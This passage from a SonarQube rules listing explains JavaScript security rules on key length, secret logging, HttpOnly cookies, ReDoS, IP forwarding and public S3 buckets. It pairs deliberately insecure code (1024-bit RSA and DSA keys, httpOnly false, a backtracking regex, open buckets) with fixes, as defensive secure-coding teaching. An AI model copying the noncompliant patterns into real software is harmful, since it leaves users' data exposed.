<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/338" rel="nofollow">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
  </li><li> <a href="https://cwe.mitre.org/data/definitions/330" rel="nofollow">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/1241" rel="nofollow">MITRE, CWE-1241</a> - Use of Predictable Algorithm in Random Number Generator </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM" rel="nofollow">Predictable Pseudo Random Number
  Generator</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4426">
              javascript:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul><li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li><li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul><li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li></ul>  </li></ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br /> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const crypto &#61; require(&#39;crypto&#39;);

function callback(err, pub, priv) {}

var { privateKey, publicKey } &#61; crypto.generateKeyPairSync(&#39;rsa&#39;, {
    modulusLength: 1024,  // Noncompliant
    publicKeyEncoding:  { type: &#39;spki&#39;, format: &#39;pem&#39; },
    privateKeyEncoding: { type: &#39;pkcs8&#39;, format: &#39;pem&#39; }
  },
  callback);
</pre>
<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
const crypto &#61; require(&#39;crypto&#39;);

function callback(err, pub, priv) {}

var { privateKey, publicKey } &#61; crypto.generateKeyPairSync(&#39;dsa&#39;, {
    modulusLength: 1024,  // Noncompliant
    publicKeyEncoding:  { type: &#39;spki&#39;, format: &#39;pem&#39; },
    privateKeyEncoding: { type: &#39;pkcs8&#39;, format: &#39;pem&#39; }
  },
  callback);
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the algorithm
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
const crypto &#61; require(&#39;crypto&#39;);

function callback(err, pub, priv) {}

var { privateKey, publicKey } &#61; crypto.generateKeyPair(&#39;ec&#39;, {
    namedCurve: &#39;secp112r2&#39;, // Noncompliant
    publicKeyEncoding:  { type: &#39;spki&#39;, format: &#39;pem&#39; },
    privateKeyEncoding: { type: &#39;pkcs8&#39;, format: &#39;pem&#39; }
  },
  callback);
</pre>
<h4>Compliant solution</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="compliant">
const crypto &#61; require(&#39;crypto&#39;);

function callback(err, pub, priv) {}

var { privateKey, publicKey } &#61; crypto.generateKeyPairSync(&#39;rsa&#39;, {
    modulusLength: 2048,
    publicKeyEncoding:  { type: &#39;spki&#39;, format: &#39;pem&#39; },
    privateKeyEncoding: { type: &#39;pkcs8&#39;, format: &#39;pem&#39; }
  },
  callback);
</pre>
<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>
<pre data-diff-id="2" data-diff-type="compliant">
const crypto &#61; require(&#39;crypto&#39;);

function callback(err, pub, priv) {}

var { privateKey, publicKey } &#61; crypto.generateKeyPairSync(&#39;dsa&#39;, {
    modulusLength: 2048,
    publicKeyEncoding:  { type: &#39;spki&#39;, format: &#39;pem&#39; },
    privateKeyEncoding: { type: &#39;pkcs8&#39;, format: &#39;pem&#39; }
  },
  callback);
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the algorithm
name:</p>
<pre data-diff-id="3" data-diff-type="compliant">
const crypto &#61; require(&#39;crypto&#39;);

function callback(err, pub, priv) {}

var { privateKey, publicKey } &#61; crypto.generateKeyPair(&#39;ec&#39;, {
    namedCurve: &#39;secp224k1&#39;,
    publicKeyEncoding:  { type: &#39;spki&#39;, format: &#39;pem&#39; },
    privateKeyEncoding: { type: &#39;pkcs8&#39;, format: &#39;pem&#39; }
  },
  callback);
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br /> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms are mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC algorithms.</p>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br /> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
&#34;post-quantum&#34;) counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation" rel="nofollow">Learn more here</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" rel="nofollow">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths* <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption
  Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5757">
              javascript:S5757
            </a>
          </td>
          <td>
            <details>
              <p>Log management is an important topic, especially for the security of a web application, to ensure user activity, including potential attackers, is
recorded and available for an analyst to understand what’s happened on the web application in case of malicious activities.</p>
<p>Retention of specific logs for a defined period of time is often necessary to comply with regulations such as GDPR, <a href="https://www.pcisecuritystandards.org/documents/Effective-Daily-Log-Monitoring-Guidance.pdf" rel="nofollow">PCI DSS</a> and others. However, to protect user’s
privacy, certain informations are forbidden or strongly discouraged from being logged, such as user passwords or credit card numbers, which obviously
should not be stored or at least not in clear text.</p>
<h2>Ask Yourself Whether</h2>
<p>In a production environment:</p>
<ul><li> The web application uses confidential information and logs a significant amount of data. </li><li> Logs are externalized to SIEM or Big Data repositories. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Loggers should be configured with a list of confidential, personal information that will be hidden/masked or removed from logs.</p>
<h2>Sensitive Code Example</h2>
<p>With <a href="https://www.npmjs.com/package/signale" rel="nofollow">Signale log management framework</a> the code is sensitive when an empty list of secrets is
defined:</p>
<pre>
const { Signale } &#61; require(&#39;signale&#39;);

const CREDIT_CARD_NUMBERS &#61; fetchFromWebForm()
// here we suppose the credit card numbers are retrieved somewhere and CREDIT_CARD_NUMBERS looks like [&#34;1234-5678-0000-9999&#34;, &#34;1234-5678-0000-8888&#34;]; for instance

const options &#61; {
  secrets: []         // empty list of secrets
};

const logger &#61; new Signale(options); // Sensitive

CREDIT_CARD_NUMBERS.forEach(function(CREDIT_CARD_NUMBER) {
  logger.log(&#39;The customer ordered products with the credit card number &#61; %s&#39;, CREDIT_CARD_NUMBER);
});
</pre>
<h2>Compliant Solution</h2>
<p>With <a href="https://www.npmjs.com/package/signale" rel="nofollow">Signale log management framework</a> it is possible to define a list of secrets that will be
hidden in logs:</p>
<pre>
const { Signale } &#61; require(&#39;signale&#39;);

const CREDIT_CARD_NUMBERS &#61; fetchFromWebForm()
// here we suppose the credit card numbers are retrieved somewhere and CREDIT_CARD_NUMBERS looks like [&#34;1234-5678-0000-9999&#34;, &#34;1234-5678-0000-8888&#34;]; for instance

const options &#61; {
  secrets: [&#34;([0-9]{4}-?)&#43;&#34;]
};

const logger &#61; new Signale(options); // Compliant

CREDIT_CARD_NUMBERS.forEach(function(CREDIT_CARD_NUMBER) {
  logger.log(&#39;The customer ordered products with the credit card number &#61; %s&#39;, CREDIT_CARD_NUMBER);
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" rel="nofollow">OWASP Top 10 2021 Category A9</a> - Security Logging and
  Monitoring Failures </li><li> <a href="https://cwe.mitre.org/data/definitions/532" rel="nofollow">MITRE, CWE-532</a> - Insertion of Sensitive Information into Log File </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html" rel="nofollow">OWASP Top 10 2017 Category
  A3</a> - Sensitive Data Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S3330">
              javascript:S3330
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li><li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /
  sensitive-security cookies. </li></ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/cookie-session" rel="nofollow">cookie-session</a> module:</p>
<pre>
let session &#61; cookieSession({
  httpOnly: false,// Sensitive
});  // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/express-session" rel="nofollow">express-session</a> module:</p>
<pre>
const express &#61; require(&#39;express&#39;),
const session &#61; require(&#39;express-session&#39;),

let app &#61; express()
app.use(session({
  cookie:
  {
    httpOnly: false // Sensitive
  }
})),
</pre>
<p><a href="https://www.npmjs.com/package/cookies" rel="nofollow">cookies</a> module:</p>
<pre>
let cookies &#61; new Cookies(req, res, { keys: keys });

cookies.set(&#39;LastVisit&#39;, new Date().toISOString(), {
  httpOnly: false // Sensitive
}); // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/csurf" rel="nofollow">csurf</a> module:</p>
<pre>
const cookieParser &#61; require(&#39;cookie-parser&#39;);
const csrf &#61; require(&#39;csurf&#39;);
const express &#61; require(&#39;express&#39;);

let csrfProtection &#61; csrf({ cookie: { httpOnly: false }}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/cookie-session" rel="nofollow">cookie-session</a> module:</p>
<pre>
let session &#61; cookieSession({
  httpOnly: true,// Compliant
});  // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/express-session" rel="nofollow">express-session</a> module:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const session &#61; require(&#39;express-session&#39;);

let app &#61; express();
app.use(session({
  cookie:
  {
    httpOnly: true // Compliant
  }
}));
</pre>
<p><a href="https://www.npmjs.com/package/cookies" rel="nofollow">cookies</a> module:</p>
<pre>
let cookies &#61; new Cookies(req, res, { keys: keys });

cookies.set(&#39;LastVisit&#39;, new Date().toISOString(), {
  httpOnly: true // Compliant
}); // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/csurf" rel="nofollow">csurf</a> module:</p>
<pre>
const cookieParser &#61; require(&#39;cookie-parser&#39;);
const csrf &#61; require(&#39;csurf&#39;);
const express &#61; require(&#39;express&#39;);

let csrfProtection &#61; csrf({ cookie: { httpOnly: true }}); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-community/HttpOnly" rel="nofollow">OWASP HttpOnly</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/1004" rel="nofollow">MITRE, CWE-1004</a> - Sensitive Cookie Without &#39;HttpOnly&#39; Flag </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE" rel="nofollow">HTTPONLY_COOKIE</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4784">
              javascript:S4784
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;javascript%3AS5852&amp;rule_key&#61;javascript%3AS5852" rel="nofollow">S5852</a> instead.</p>
<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-16021" rel="nofollow">CVE-2017-16021</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-13863" rel="nofollow">CVE-2018-13863</a> </li></ul>
<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as
<code>(a&#43;)&#43;s</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with
every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a&#43;s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating such regular expressions opens the door to <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">Regular expression Denial of Service (ReDoS)</a> attacks.
In the context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making
the service inaccessible to genuine users.</p>
<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and at least two instances of any of the following
characters: <code>*&#43;{<!-- --></code>.</p>
<p>Example: <code>(a&#43;)*</code></p>
<h2>Ask Yourself Whether</h2>
<ul><li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li><li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you’re are using.</p>
<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href="https://github.com/google/re2" rel="nofollow">Google Re2</a>.</p>
<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won’t detect this kind of injection.</p>
<h2>Sensitive Code Example</h2>
<pre>
const regex &#61; /(a&#43;)&#43;b/; // Sensitive
const regex2 &#61; new RegExp(&#34;(a&#43;)&#43;b&#34;); // Sensitive

str.search(&#34;(a&#43;)&#43;b&#34;); // Sensitive
str.match(&#34;(a&#43;)&#43;b&#34;); // Sensitive
str.split(&#34;(a&#43;)&#43;b&#34;); // Sensitive
</pre>
<p>Note: String.matchAll does not raise any issue as it is not supported by NodeJS.</p>
<h2>Exceptions</h2>
<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)&#43;</code>,
<code>(a|a?)&#43;</code>.</p>
<p>It is a good idea to test your regular expression if it has the same pattern on both side of a &#34;<code>|</code>&#34;.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">MITRE, CWE-624</a> - Executable Regular
  Expression Error </li><li> OWASP Regular expression Denial of Service - ReDoS </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5759">
              javascript:S5759
            </a>
          </td>
          <td>
            <details>
              <p>Users often connect to web servers through HTTP proxies.</p>
<p>Proxy can be configured to forward the client IP address via the <code>X-Forwarded-For</code> or <code>Forwarded</code> HTTP headers.</p>
<p>IP address is a personal information which can identify a single user and thus impact his privacy.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The web application uses reverse proxies or similar but doesn’t need to know the IP address of the user. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>User IP address should not be forwarded unless the application needs it, as part of an authentication, authorization scheme or log management for
examples.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://github.com/http-party/node-http-proxy" rel="nofollow">node-http-proxy</a></p>
<pre>
var httpProxy &#61; require(&#39;http-proxy&#39;);

httpProxy.createProxyServer({target:&#39;http://localhost:9000&#39;, xfwd:true}) // Noncompliant
  .listen(8000);
</pre>
<p><a href="https://github.com/chimurai/http-proxy-middleware" rel="nofollow">http-proxy-middleware</a></p>
<pre>
var express &#61; require(&#39;express&#39;);

const { createProxyMiddleware } &#61; require(&#39;http-proxy-middleware&#39;);

const app &#61; express();

app.use(&#39;/proxy&#39;, createProxyMiddleware({ target: &#39;http://localhost:9000&#39;, changeOrigin: true, xfwd: true })); // Noncompliant
app.listen(3000);
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://github.com/http-party/node-http-proxy" rel="nofollow">node-http-proxy</a></p>
<pre>
var httpProxy &#61; require(&#39;http-proxy&#39;);

// By default xfwd option is false
httpProxy.createProxyServer({target:&#39;http://localhost:9000&#39;}) // Compliant
  .listen(8000);
</pre>
<p><a href="https://github.com/chimurai/http-proxy-middleware" rel="nofollow">http-proxy-middleware</a></p>
<pre>
var express &#61; require(&#39;express&#39;);

const { createProxyMiddleware } &#61; require(&#39;http-proxy-middleware&#39;);

const app &#61; express();

// By default xfwd option is false
app.use(&#39;/proxy&#39;, createProxyMiddleware({ target: &#39;http://localhost:9000&#39;, changeOrigin: true})); // Compliant
app.listen(3000);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html" rel="nofollow">OWASP Top 10 2017 Category
  A3</a> - Sensitive Data Exposure </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For" rel="nofollow">developer.mozilla.org</a> - X-Forwarded-For </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6281">
              javascript:S6281
            </a>
          </td>
          <td>
            <details>
              <p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>
<p>This access control can be relaxed with ACLs or policies.</p>
<p>To prevent permissive policies or ACLs to be set on a S3 bucket the following booleans settings can be enabled:</p>
<ul><li> <code>blockPublicAcls</code>: to block or not public ACLs to be set to the S3 bucket. </li><li> <code>ignorePublicAcls</code>: to consider or not existing public ACLs set to the S3 bucket. </li><li> <code>blockPublicPolicy</code>: to block or not public policies to be set to the S3 bucket. </li><li> <code>restrictPublicBuckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket
  owner account. </li></ul>
<p>The other attribute <code>BlockPublicAccess.BLOCK_ACLS</code> only turns on <code>blockPublicAcls</code> and <code>ignorePublicAcls</code>. The
public policies can still affect the S3 bucket.</p>
<p>However, all of those options can be enabled by setting the <code>blockPublicAccess</code> property of the S3 bucket to
<code>BlockPublicAccess.BLOCK_ALL</code>.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive data. </li><li> The S3 bucket is not used to store static resources of websites (images, css …​). </li><li> Many users have the permission to set ACL or policy to the S3 bucket. </li><li> These settings are not already enforced to true at the account level. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to configure:</p>
<ul><li> <code>blockPublicAcls</code> to <code>True</code> to block new attempts to set public ACLs. </li><li> <code>ignorePublicAcls</code> to <code>True</code> to block existing public ACLs. </li><li> <code>blockPublicPolicy</code> to <code>True</code> to block new attempts to set public policies. </li><li> <code>restrictPublicBuckets</code> to <code>True</code> to restrict existing public policies. </li></ul>
<h2>Sensitive Code Example</h2>
<p>By default, when not set, the <code>blockPublicAccess</code> is fully deactivated (nothing is blocked):</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;bucket&#39;
}); // Sensitive
</pre>
<p>This <code>block_public_access</code> allows public ACL to be set:</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;bucket&#39;,
    blockPublicAccess: new s3.BlockPublicAccess({
        blockPublicAcls         : false, // Sensitive
        blockPublicPolicy       : true,
        ignorePublicAcls        : true,
        restrictPublicBuckets   : true
    })
});
</pre>
<p>The attribute <code>BLOCK_ACLS</code> only blocks and ignores public ACLs:</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;bucket&#39;,
    blockPublicAccess: s3.BlockPublicAccess.BLOCK_ACLS // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<p>This <code>blockPublicAccess</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public policies:</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;bucket&#39;,
    blockPublicAccess: s3.BlockPublicAccess.BLOCK_ALL
});
</pre>
<p>A similar configuration to the one above can be obtained by setting all parameters of the <code>blockPublicAccess</code></p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;bucket&#39;,
    blockPublicAccess: new s3.BlockPublicAccess({
        blockPublicAcls         : true,
        blockPublicPolicy       : true,
        ignorePublicAcls        : true,
        restrictPublicBuckets   : true
    })
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html" rel="nofollow">AWS Documentation</a> - Blocking public
